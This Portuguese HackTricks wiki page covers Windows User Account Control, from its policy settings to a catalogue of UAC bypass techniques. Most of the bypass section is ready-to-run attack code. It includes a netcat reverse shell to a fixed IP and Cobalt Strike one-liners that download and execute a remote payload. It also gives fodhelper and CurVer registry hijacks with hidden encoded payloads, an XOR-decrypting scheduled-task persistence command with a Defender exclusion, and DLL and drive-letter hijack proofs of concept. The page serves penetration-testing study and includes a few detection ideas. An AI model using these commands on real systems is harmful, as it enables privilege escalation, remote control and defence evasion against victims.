# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades elevadas**. Aplicações têm diferentes níveis de `integrity`, e um programa com um **alto nível** pode executar tarefas que **podem potencialmente comprometer o sistema**. Quando o UAC está habilitado, aplicações e tarefas sempre **são executadas sob o contexto de segurança de uma conta não-administradora** a menos que um administrador autorize explicitamente essas aplicações/tarefas a ter acesso de nível administrador ao sistema para serem executadas. É um recurso de conveniência que protege administradores de mudanças não intencionais, mas não é considerado um limite de segurança.

Para mais info sobre integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando o UAC está em vigor, um usuário administrador recebe 2 tokens: uma chave de usuário padrão, para executar ações regulares em nível regular, e outra com privilégios de administrador.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute em grande profundidade como o UAC funciona e inclui o processo de logon, a experiência do usuário e a arquitetura do UAC. Administradores podem usar políticas de segurança para configurar como o UAC funciona especificamente para sua organização no nível local (usando secpol.msc), ou configurado e distribuído via Group Policy Objects (GPO) em um ambiente de domínio Active Directory. As várias configurações são discutidas em detalhe [aqui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Há 10 configurações de Group Policy que podem ser definidas para o UAC. A tabela a seguir fornece detalhes adicionais:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

As **local security policies** ("secpol.msc" na maioria dos sistemas) são configuradas por padrão para **impedir que usuários não-admin realizem instalações de software**. Isso significa que, mesmo que um usuário não-admin possa baixar o instalador do seu software, ele não conseguirá executá-lo sem uma conta de admin.

### Registry Keys to Force UAC to Ask for Elevation

Como um usuário padrão sem privilégios de admin, você pode garantir que a conta "standard" seja **solicitada a fornecer credenciais pelo UAC** quando tentar executar certas ações. Essa ação exigiria modificar certas **registry keys**, para as quais você precisa de permissões de admin, a menos que exista um **UAC bypass**, ou o atacante já esteja logado como admin.

Mesmo que o usuário esteja no grupo **Administrators**, essas mudanças forçam o usuário a **reinsere suas credenciais da conta** para executar ações administrativas.

**A única desvantagem é que essa abordagem precisa do UAC desabilitado para funcionar, o que provavelmente não é o caso em ambientes de produção.**

As registry keys e entradas que você deve alterar são as seguintes (com seus valores padrão entre parênteses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Isso também pode ser feito manualmente por meio da ferramenta Local Security Policy. Depois de alteradas, as operações administrativas solicitam que o usuário reinsira suas credenciais.

### Note

**User Account Control is not a security boundary.** Portanto, usuários padrão não podem sair de suas contas e obter privilégios de administrador sem um exploit de local privilege escalation.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilégios do UAC

- O Internet Explorer Protected Mode usa verificações de integridade para impedir que processos de alto nível de integridade (como navegadores web) acessem dados de baixo nível de integridade (como a pasta de Temporary Internet Files). Isso é feito executando o navegador com um token de baixa integridade. Quando o navegador tenta acessar dados armazenados na zona de baixa integridade, o sistema operacional verifica o nível de integridade do processo e permite o acesso de acordo com isso. Esse recurso ajuda a impedir que ataques de remote code execution obtenham acesso a dados sensíveis no sistema.
- Quando um usuário faz logon no Windows, o sistema cria um access token que contém uma lista dos privilégios do usuário. Privilégios são definidos como a combinação dos direitos e capacidades de um usuário. O token também contém uma lista das credenciais do usuário, que são credenciais usadas para autenticar o usuário no computador e em recursos na rede.

### Autoadminlogon

Para configurar o Windows para fazer logon automaticamente de um usuário específico na inicialização, defina a **`AutoAdminLogon` registry key**. Isso é útil para ambientes kiosk ou para testes. Use isso apenas em sistemas seguros, pois isso expõe a senha no registry.

Defina as seguintes chaves usando o Registry Editor ou `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para reverter ao comportamento normal de logon, defina `AutoAdminLogon` para 0.

## UAC bypass

> [!TIP]
> Note que, se você tiver acesso gráfico à vítima, o UAC bypass é direto, pois você pode simplesmente clicar em "Yes" quando o prompt do UAC aparecer

O UAC bypass é necessário na seguinte situação: **o UAC está ativado, seu processo está sendo executado em um contexto de integridade média, e seu usuário pertence ao grupo administrators**.

É importante mencionar que é **muito mais difícil contornar o UAC se ele estiver no nível de segurança mais alto (Always) do que se estiver em qualquer um dos outros níveis (Default).**

### UAC disabled

Se o UAC já estiver desativado (`ConsentPromptBehaviorAdmin` é **`0`**), você pode **executar uma reverse shell com privilégios de admin** (alto nível de integridade) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Se você tiver uma shell com um usuário que está dentro do grupo Administrators, você pode **montar o C$** compartilhado via SMB (file system) local em um novo disco e você terá **acesso a tudo dentro do file system** (até mesmo à pasta pessoal do Administrator).

> [!WARNING]
> **Parece que esse truque não está funcionando mais**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

As técnicas do Cobalt Strike só funcionarão se o UAC não estiver definido no seu nível máximo de segurança
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** também têm vários módulos para **bypass** do **UAC**.

### KRBUACBypass

Documentação e ferramenta em [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass do UAC

[**UACME** ](https://github.com/hfiref0x/UACME) que é uma **compilação** de vários exploits de bypass do UAC. Note que você precisará **compilar o UACME usando visual studio ou msbuild**. A compilação criará vários executáveis (como `Source\Akagi\outout\x64\Debug\Akagi.exe`) , você precisará saber **qual deles você precisa.**\
Você deve **ter cuidado** porque alguns bypasses vão **abrir alguns outros programas** que irão **alertar** o **usuário** de que algo está acontecendo.

O UACME tem a **versão de build a partir da qual cada técnica começou a funcionar**. Você pode procurar por uma técnica que afete suas versões:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Também, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página você obtém a release do Windows `1607` a partir das versões de build.

### UAC Bypass – fodhelper.exe (Registry hijack)

O binário confiável `fodhelper.exe` é auto-elevated em Windows modernos. Quando iniciado, ele consulta o caminho de registry por usuário abaixo sem validar o verbo `DelegateExecute`. Inserir um comando ali permite que um processo de Medium Integrity (o user está em Administrators) inicie um processo de High Integrity sem um prompt de UAC.

Caminho de registry consultado por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passos do PowerShell (defina seu payload, depois dispare)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona quando o usuário atual é membro de Administrators e o nível do UAC é o padrão/leniente (não Always Notify com restrições extras).
- Use o caminho `sysnative` para iniciar um PowerShell de 64 bits a partir de um processo de 32 bits em Windows de 64 bits.
- O payload pode ser qualquer comando (PowerShell, cmd, ou um caminho de EXE). Evite interfaces gráficas que solicitem entrada para manter o stealth.

#### Variante de hijack de CurVer/extension (somente HKCU)

Amostras recentes abusando de `fodhelper.exe` evitam `DelegateExecute` e, em vez disso, **redirecionam o ProgID `ms-settings`** via o valor `CurVer` por usuário. O binário com autoelevação ainda resolve o handler em `HKCU`, então nenhum token de admin é necessário para criar as keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Uma vez elevado, malware comumente **desativa prompts futuros** ao definir `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` como `0`, depois realiza evasão adicional de defesa (por exemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) e recria persistência para executar com alta integridade. Uma tarefa típica de persistência armazena um **script PowerShell criptografado com XOR** em disco e o decodifica/executa na memória a cada hora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante ainda limpa o dropper e deixa apenas os payloads staged, fazendo a detecção depender do monitoramento do **`CurVer` hijack**, da adulteração de `ConsentPromptBehaviorAdmin`, da criação de exclusões do Defender ou de scheduled tasks que descriptografam PowerShell em memória.

#### Mais UAC bypass

**Todas** as técnicas usadas aqui para burlar AUC **exigem** um **full interactive shell** com a vítima (um shell comum do nc.exe não é suficiente).

Você pode conseguir usando uma sessão **meterpreter**. Migre para um **processo** que tenha o valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

Se você tiver acesso a uma **GUI**, pode simplesmente aceitar o prompt de UAC quando ele aparecer; na verdade, você não precisa de um bypass. Então, obter acesso a uma GUI permitirá que você burle o UAC.

Além disso, se você obtiver uma sessão GUI que alguém estava usando (potencialmente via RDP), há **algumas ferramentas que estarão sendo executadas como administrator** de onde você poderia **executar** um **cmd**, por exemplo, **como admin** diretamente, sem ser solicitado novamente pelo UAC, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Isso pode ser um pouco mais **stealthy**.

### Noisy brute-force UAC bypass

Se você não se importar em ser noisy, você sempre pode **executar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), que **pede para elevar permissões até que o usuário aceite**.

### Seu próprio bypass - Metodologia básica de UAC bypass

Se você der uma olhada no **UACME**, notará que **a maioria dos UAC bypasses abusa de uma vulnerabilit**y de **Dll Hijacking** (principalmente escrevendo a dll maliciosa em _C:\Windows\System32_). [Leia isto para aprender como encontrar uma vulnerabilidade de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encontre um binário que **autoelevate** (verifique que, quando ele é executado, roda em um high integrity level).
2. Com o procmon, encontre eventos "**NAME NOT FOUND**" que possam ser vulneráveis a **DLL Hijacking**.
3. Você provavelmente vai precisar **escrever** a DLL dentro de alguns **protected paths** (como C:\Windows\System32) nos quais você não tem permissões de escrita. Você pode contornar isso usando:
1. **wusa.exe**: Windows 7,8 e 8.1. Ele permite extrair o conteúdo de um arquivo CAB dentro de protected paths (porque essa ferramenta é executada a partir de um high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare um **script** para copiar sua DLL para dentro do protected path e executar o binário vulnerável e autoelevated.

### Outra técnica de UAC bypass

Consiste em observar se um binário **autoElevated** tenta **ler** do **registry** o **nome/caminho** de um **binário** ou **comando** a ser **executado** (isso é mais interessante se o binário procurar essa informação dentro do **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

O `C:\Windows\SysWOW64\iscsicpl.exe` de 32 bits é um binário **auto-elevated** que pode ser abusado para carregar `iscsiexe.dll` por search order. Se você conseguir colocar uma `iscsiexe.dll` maliciosa dentro de uma pasta **user-writable** e então modificar o `PATH` do current user (por exemplo via `HKCU\Environment\Path`) para que essa pasta seja pesquisada, o Windows pode carregar a DLL do atacante dentro do processo elevado `iscsicpl.exe` **sem mostrar um prompt de UAC**.

Notas práticas:
- Isso é útil quando o current user está em **Administrators** mas rodando em **Medium Integrity** por causa do UAC.
- A cópia do **SysWOW64** é a relevante para esse bypass. Trate a cópia de **System32** como um binário separado e valide o comportamento independentemente.
- O primitive é uma combinação de **auto-elevation** e **DLL search-order hijacking**, então o mesmo fluxo do ProcMon usado para outros UAC bypasses é útil para validar a ausência do load da DLL.

Fluxo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideias de detecção:
- Alertar em `reg add` / gravações no registry para `HKCU\Environment\Path` imediatamente seguidas pela execução de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Procurar por `iscsiexe.dll` em locais **controlados pelo usuário** como `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacionar execuções de `iscsicpl.exe` com processos filhos inesperados ou DLL loads de fora dos diretórios normais do Windows.

### Hijack de drive-letter via drive letter hijack do mapeamento DOS device por sessão de logon no Administrator Protection (25H2)

O Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens com mapas por sessão `\Sessions\0\DosDevices/<LUID>`. O diretório é criado sob demanda por `SeGetTokenDeviceMap` na primeira resolução de `\??`. Se o atacante se passar pelo shadow-admin token apenas em **SecurityIdentification**, o diretório é criado com o atacante como **owner** (herda `CREATOR OWNER`), permitindo links de drive-letter que têm precedência sobre `\GLOBAL??`.

**Passos:**

1. A partir de uma sessão com poucos privilégios, chame `RAiProcessRunOnce` para iniciar um `runonce.exe` shadow-admin sem prompt.
2. Duplique seu primary token para um token de **identification** e faça impersonation dele enquanto abre `\??` para forçar a criação de `\Sessions\0\DosDevices/<LUID>` sob ownership do atacante.
3. Crie ali um symlink `C:` apontando para storage controlado pelo atacante; acessos posteriores ao filesystem nessa sessão resolvem `C:` para o path do atacante, permitindo DLL/file hijack sem prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
